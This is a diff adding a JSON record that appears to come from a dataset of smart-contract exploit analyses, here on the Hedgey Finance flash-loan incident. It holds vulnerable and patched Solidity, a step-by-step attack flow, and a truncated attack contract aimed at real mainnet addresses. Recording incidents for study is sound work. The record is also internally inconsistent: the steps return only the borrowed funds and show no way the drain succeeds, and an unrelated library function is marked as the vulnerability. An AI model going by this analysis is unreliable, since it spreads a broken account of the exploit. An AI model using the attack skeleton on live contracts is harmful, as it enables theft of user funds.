@@ -1,0 +1,37 @@
+{
+ "id": "2024__2024-04-XX_HedgeyFinance_FlashLoanCampaign",
+ "source_file": "2024/2024-04-XX_HedgeyFinance_FlashLoanCampaign.md",
+ "title": "Hedgey Finance — createLockedCampaign/cancelCampaign Instant Withdrawal Vulnerability Analysis",
+ "date": "2024-04-01",
+ "protocol": "Hedgey Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$48,000,000",
+ "loss_usd": 48000000.0,
+ "root_cause": "`cancelCampaign()` returns deposited funds immediately to the original depositor without validating the lock period, enabling a create-cancel cycle within the same transaction to drain funds",
+ "attack_tx": null,
+ "vulnerable_contract": "HedgeyFinance 0xBc452fdC",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: campaign can be cancelled immediately after creation\ninterface IClaimCampaigns {\n    function createLockedCampaign(\n        bytes16 id,\n        Campaign memory campaign,\n        ClaimLockup memory claimLockup,\n        TokenLockup calldata tokenLockup\n    ) external;\n\n    function cancelCampaign(bytes16 id) external;\n}\n\n// cancelCampaign(): returns the full remaining balance to the campaign creator\n// Full refund on immediate cancellation after creation — no minimum holding period\n\n//",
+  "// File: ClaimCampaigns.sol\n  function cancelCampaign(bytes16 campaignId) external nonReentrant {  // ❌ Vulnerability\n    Campaign memory campaign = campaigns[campaignId];\n    require(campaign.manager == msg.sender, '!manager');\n    delete campaigns[campaignId];\n    delete claimLockups[campaignId];\n    TransferHelper.withdrawTokens(campaign.token, msg.sender, campaign.amount);\n    emit CampaignCancelled(campaignId);\n  }",
+  "// File: Address.sol\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {  // ❌ Vulnerability\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *"
+ ],
+ "code_after": [
+  "✅ Safe code: enforce a minimum campaign duration\nmapping(bytes16 => uint256) public campaignCreationBlock;\n\nfunction cancelCampaign(bytes16 id) external {\n    require(\n        block.number >= campaignCreationBlock[id] + MIN_CAMPAIGN_DURATION,\n        \"campaign too new\"\n    );\n    // ... cancellation logic\n}"
+ ],
+ "steps": [
+  "→ [1] Balancer flash loan: 1,305,000 USDC",
+  "→ [2] HedgeyFinance.approve(HedgeyFinance, 1,305,000 USDC)",
+  "→ [3] createLockedCampaign(id, ..., 1,305,000 USDC)",
+  "→ [4] cancelCampaign(id)",
+  "→ [5] Withdraw full USDC amount from HedgeyFinance",
+  "→ [6] Repay Balancer flash loan (including fees)",
+  "→ [7] Repeat to drain ~$48M"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Balancer flash loan: 1,305,000 USDC\n  │\n  ├─→ [2] HedgeyFinance.approve(HedgeyFinance, 1,305,000 USDC)\n  │\n  ├─→ [3] createLockedCampaign(id, ..., 1,305,000 USDC)\n  │         └─ Create campaign using flash-loaned USDC\n  │\n  ├─→ [4] cancelCampaign(id)\n  │         └─ 1,305,000 USDC immediately returned to campaign creator (attacker)\n  │\n  ├─→ [5] Withdraw full USDC amount from HedgeyFinance\n  │\n  ├─→ [6] Repay Balancer flash loan (including fees)\n  │\n  └─→ [7] Repeat to drain ~$48M",
+  "interface IClaimCampaigns {\n    struct Campaign { /* ... */ }\n    struct ClaimLockup { /* ... */ }\n    struct TokenLockup { /* ... */ }\n\n    function createLockedCampaign(bytes16 id, Campaign memory campaign, ClaimLockup memory claimLockup, TokenLockup calldata tokenLockup) external;\n    function cancelCampaign(bytes16 id) external;\n}\n\ninterface IBalancerVault {\n    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;\n}\n\ncontract AttackContract {\n    IClaimCampaigns constant hedgey   = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);\n    IBalancerVault  constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    IERC20          constant USDC     = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0"
+ ]
+}
